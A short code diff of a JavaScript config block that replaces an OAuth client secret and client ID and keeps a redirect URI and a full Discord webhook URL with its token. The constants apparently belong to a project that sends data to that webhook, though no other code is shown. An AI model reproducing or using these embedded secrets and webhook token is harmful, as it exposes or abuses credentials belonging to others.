@@ -1,6 +1,6 @@
 //Config
-const secret_value = 'YHP8Q~5zu9Os6FJ5xjF-Iso6Pab6VLI5ZIQCgamd'
-const client_id = '6ac61fee-049d-4ee3-b4a1-d52fa315f9bb'
+const secret_value = 'irh8Q~OCKxaO3I0d32REhDNUUO3Uf.tbz~KPEb-J'
+const client_id = '37dacca5-a176-4047-9ff7-5a98be33b718'
 const redirect_uri = 'https://uninterested-bedclothes-slug.cyclic.app'
 const webhook_url = 'https://discordapp.com/api/webhooks/1074223565781602374/vrubpICILRQih0sT4qMol0Lfn3qER2Oia8cKv1lAAEvqR6zDi8db9xu-6uO99YknMvtZ'
 //Requirements
